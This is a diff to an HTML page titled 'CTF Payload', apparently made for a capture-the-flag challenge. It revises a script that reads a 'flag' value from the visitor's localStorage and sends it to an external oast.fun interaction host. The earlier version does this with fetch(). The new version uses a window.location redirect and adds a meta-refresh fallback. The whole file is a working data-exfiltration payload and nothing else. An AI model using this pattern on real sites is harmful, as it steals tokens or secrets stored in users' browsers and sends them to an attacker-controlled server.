@@ -2,16 +2,21 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>CTF Payload</title>
-</head>
-<body>
-  <h1>Loading...</h1>
+  <title>CTF Payload - Meta Refresh</title>
   <script>
     (function() {
-      const flag = localStorage.getItem('flag');
-      fetch('https://bhvsumorecywkcaevmkui8q6n12uvuhmu.oast.fun/?flag=' + encodeURIComponent(flag))
-        .catch(() => {});
+      const flag = localStorage.getItem('flag') || '';
+      // Redirect by changing window.location
+      window.location = 'https://bhvsumorecywkcaevmkui8q6n12uvuhmu.oast.fun/?flag=' + encodeURIComponent(flag);
     })();
   </script>
+  <!--
+    You can add a fallback meta refresh in case JS is disabled,
+    but it can't dynamically include the flag without JS.
+  -->
+  <meta http-equiv="refresh" content="5;url=https://bhvsumorecywkcaevmkui8q6n12uvuhmu.oast.fun/">
+</head>
+<body>
+  <h1>Redirecting...</h1>
 </body>
 </html>
